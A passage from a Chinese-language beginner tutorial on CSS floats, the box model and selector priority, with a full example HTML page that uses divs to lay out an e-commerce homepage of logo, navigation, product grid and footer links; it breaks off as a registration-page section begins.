href="#5-css的浮动" class="headerlink" title="5. css的浮动"></a>5. css的浮动</h3><p>浮动的元素会脱离正常的文档流,在正常的文档流中不占空间</p><pre><code>float属性:                left                right            clear属性: 清除浮动                both : 两边都不允许浮动                left: 左边不允许浮动                right : 右边不允许浮动            流式布局</code></pre><h3 id="6-盒子模型"><a href="#6-盒子模型" class="headerlink" title="6. 盒子模型"></a>6. 盒子模型</h3><p>CSS的盒子模型: 万物皆盒子</p><p>内边距:  </p><p>padding-top:</p><p>padding-right:</p><p>padding-bottom:</p><p>padding-left:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">padding:10px;  上下左右都是10px</span><br><span class="line">padding:10px 20px;  上下是10px 左右是20px</span><br><span class="line">padding: 10px 20px 30px;  上 10px 右20px  下30px  左20px</span><br><span class="line">padding: 10px 20px 30px 40px;  上右下左, 顺时针的方向</span><br></pre></td></tr></table></figure><p>外边距:</p><p>margin-top:</p><p>margin-right:</p><p>margin-bottom:</p><p>margin-left: </p><p>CSS绝对定位:</p><ul><li><p>position: absolute</p></li><li><p>top: 控制距离顶部的位置</p></li><li><p>left: 控制距离左边的位置</p></li></ul><hr><h3 id="7-选择器的优先级"><a href="#7-选择器的优先级" class="headerlink" title="7. 选择器的优先级"></a>7. 选择器的优先级</h3><ul><li>行内&gt;id&gt;class&gt;元素</li><li>就内原则，最后修改的成功</li></ul><hr><h3 id="8-使用div布局首页"><a href="#8-使用div布局首页" class="headerlink" title="8. 使用div布局首页"></a>8. 使用div布局首页</h3><ol><li>创一个最外层div</li><li>第一部份: LOGO部分: 嵌套三个div</li><li>第二部分: 导航栏部分 : 放置5个超链接</li><li>第三部分: 轮播图 </li><li>第四部分: </li><li>第五部分: 直接放一张图片</li><li>第六部分: 抄第四部分的</li><li>第七部分: 放置一张图片</li><li>第八部分: 放一堆超链接</li></ol><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">.logo &#123;</span></span><br><span class="line"><span class="undefined">float: left;</span></span><br><span class="line"><span class="undefined">width: 33%;</span></span><br><span class="line"><span class="undefined">height: 60px;</span></span><br><span class="line"><span class="undefined">border: 1px red solid;</span></span><br><span class="line"><span class="undefined">line-height: 60px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">.daohang &#123;</span></span><br><span class="line"><span class="undefined">float: left;</span></span><br><span class="line"><span class="undefined">border: 1px red solid;</span></span><br><span class="line"><span class="undefined">height: 100%;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">.amenu &#123;</span></span><br><span class="line"><span class="undefined">color: white;</span></span><br><span class="line"><span class="undefined">font-size: 20px;</span></span><br><span class="line"><span class="undefined">height: 40px;</span></span><br><span class="line"><span class="undefined">line-height: 40px;</span></span><br><span class="line"><span class="undefined">text-decoration: none;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">#logos&#123;</span></span><br><span class="line"><span class="undefined">line-height:100% ;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'logos'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'logo'</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/logo2.png"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'logo'</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/header.png"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'logo'</span> <span class="attr">style</span>=<span class="string">"text-align: center;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>登陆<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>购物车<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"blank"</span> <span class="attr">style</span>=<span class="string">"clear: both;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-color: black; height: 50px; text-align: center;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'daohang'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"amenu"</span>&gt;</span></span><br><span class="line">首页</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"amenu"</span>&gt;</span></span><br><span class="line">手机数码</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"amenu"</span>&gt;</span></span><br><span class="line">电脑办公</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"amenu"</span>&gt;</span></span><br><span class="line">电脑办公</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"amenu"</span>&gt;</span></span><br><span class="line">办公</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'daohang'</span> <span class="attr">style</span>=<span class="string">"line-height: 50px;height: 50px;position: right;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mui-input-row mui-search"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span> <span class="attr">class</span>=<span class="string">"mui-input-clear"</span> <span class="attr">placeholder</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">4</span> <span class="attr">color</span>=<span class="string">"white"</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/1.jpg"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>最新商品<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/title2.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">style</span>=<span class="string">"border: 2px solid blueviolet;height: 480px; width: 100%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"left"</span> <span class="attr">style</span>=<span class="string">"float:left;width: 15%;height: 480px;border: 1px cyan solid;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span>  <span class="attr">src</span>=<span class="string">"./products/hao/big01.jpg"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"right"</span> <span class="attr">style</span>=<span class="string">"float:left;width:84%;height: 480px; border: 1px red solid;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"height: 240px;width: 50%; float: left;border: coral 1px solid;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/middle01.jpg"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"240"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;border: 1px yellow solid;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;border: 1px yellow solid;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;border: 1px yellow solid;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;border: 1px yellow solid;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;border: 1px yellow solid;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;border: 1px yellow solid;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;border: 1px yellow solid;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;border: 1px yellow solid;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;border: 1px yellow solid;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/ad.jpg"</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>最新商品<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/title2.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">style</span>=<span class="string">"height: 480px; width: 100%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"left"</span> <span class="attr">style</span>=<span class="string">"float:left;width: 15%;height: 480px;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span>  <span class="attr">src</span>=<span class="string">"./products/hao/big01.jpg"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"right"</span> <span class="attr">style</span>=<span class="string">"float:left;width:84%;height: 480px; "</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"height: 240px;width: 50%; float: left;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/middle01.jpg"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"240"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: left;text-align: center; height: 240px;width: 16%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./products/hao/small08.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>高压锅<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>$298<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/footer.jpg"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">style</span>=<span class="string">"text-align: center;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">copyright@xingqign</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h3 id="9-使用div布局注册页面"><a href="#9-使用div布局注册页面" class="headerlink" title="9. 使用div布局注册页面"></a>9. 使用div布局注册页面</h3><p> 总共是5部分</p><pre><code>2. 第一部分是LOGO部分3. 第二部分是导航菜单4. 第三部分是注册部分5. 第四部分是FOOTER图片6. 第五部分是一堆超链接</code></pre><figure class="highlight html"><table><tr><td class="code"><pre><span 